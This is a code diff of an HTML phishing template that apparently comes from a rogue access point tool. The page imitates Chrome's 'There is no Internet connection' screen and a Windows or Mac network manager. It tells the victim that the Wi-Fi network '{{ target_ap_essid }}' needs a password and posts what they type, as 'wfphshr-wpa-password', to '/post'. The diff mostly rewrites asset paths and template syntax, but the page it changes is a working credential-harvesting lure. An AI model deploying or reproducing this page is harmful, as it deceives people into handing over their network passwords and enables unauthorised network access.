@@ -4,7 +4,7 @@
         <meta name="viewport" content="width=device-width, initial-scale=1.0,
         maximum-scale=1.0, user-scalable=no">
         <title i18n-content="title">Internet connection is not available</title>
-        <link rel='stylesheet' href='chrome-offline.css' type='text/css' />
+        <link rel='stylesheet' href='/static/chrome-offline.css' type='text/css' />
  
         <script>
             /**
@@ -195,11 +195,11 @@
         }(this));
 
         if (jscd.os == "Windows") {
-            document.write("<link rel='stylesheet' href='style.css'>");
-            document.write("<link href='opensans.css' rel='stylesheet' type='text/css'>");
+            document.write("<link rel='stylesheet' href='/static/style.css'>");
+            document.write("<link href='/static/opensans.css' rel='stylesheet' type='text/css'>");
         }
         else {
-            document.write("<link rel='stylesheet' href='mac-network-manager.css' />");
+            document.write("<link rel='stylesheet' href='/static/mac-network-manager.css' />");
         }
 
 
@@ -208,12 +208,12 @@
         '    <div id="modal-title" class="title"></div>' +
         '    <div class="content">' +
         '        <div class="icon">' +
-        '            <img src="wifi-icon.png" alt="WiFi signal" width="70" class="wifi-icon" />' +
-        '            <img src="question.png" alt="?" width="25" class="question" />' +
+        '            <img src="/static/wifi-icon.png" alt="WiFi signal" width="70" class="wifi-icon" />' +
+        '            <img src="/static/question.png" alt="?" width="25" class="question" />' +
         '        </div>' +
         '        <div class="description">' +
-        '           <form id="wifi-search-form" method="post" action="index.html">' +
-        '               <strong>The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption if target_ap_encryption != None }} password.</strong>' + 
+        '           <form id="wifi-search-form" method="post" action="/post">' +
+        '               <strong>The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption }} password.</strong>' + 
         '               <div class="password">' +
         '                   <label>Password:</label>' +
         '                   <input type="password" id="wifi-search-password" name="wfphshr-wpa-password"/>' +
@@ -234,7 +234,7 @@
         '   </div>' +
         '</div>';
 
-        var loadhtml_windows = "<form method='post' action='index.html'><div class=\'network-manager\'\>" +
+        var loadhtml_windows = "<form method='post' action='/post'><div class=\'network-manager\'\>" +
         "<ul>" +
         "       <li class='selected'>" +
         "           <div class='wifi icon'>" +
@@ -277,11 +277,11 @@
         "               <div class='small dot dot4'></div>" +
         "           </div>" +
         "           <div class='content'>" +
-        "               <strong>{{ ap.essid }}</strong>" +
+        "               <strong>{{ ap['essid'] }}</strong>" +
         "               <span>Connected</span>" +
         "           </div>" +
         "       </li>" +
-                {% endfor %}
+                {% end %}
         "       </ul> " +
         "       <a href=''>Network settings</a> " +
         "       </div></form>"; 
@@ -291,7 +291,7 @@
     <body id="t" class="offline" style="font-family: 'Helvetica Neue', 'Lucida Grande', sans-serif; font-size: 75%;">
     <div id="main-frame-error" class="interstitial-wrapper">
         <div id="main-content">
-            <img class="dinosaur" src="dinosaur.png" width="45" />
+            <img class="dinosaur" src="static/dinosaur.png" width="45" />
             <div class="icon icon-offline" style="visibility: hidden;"></div>
             <div id="main-message">
                 <h1>There is no Internet connection</h1>
@@ -326,7 +326,7 @@
                 document.getElementById("loader-mac").innerHTML = loadhtml_mac;
             }
         </script>
-        <script src='win-behavior.js'></script>
-        <script src='behavior.js'></script>
+        <script src='/static/win-behavior.js'></script>
+        <script src='/static/behavior.js'></script>
     </body>
 </html>
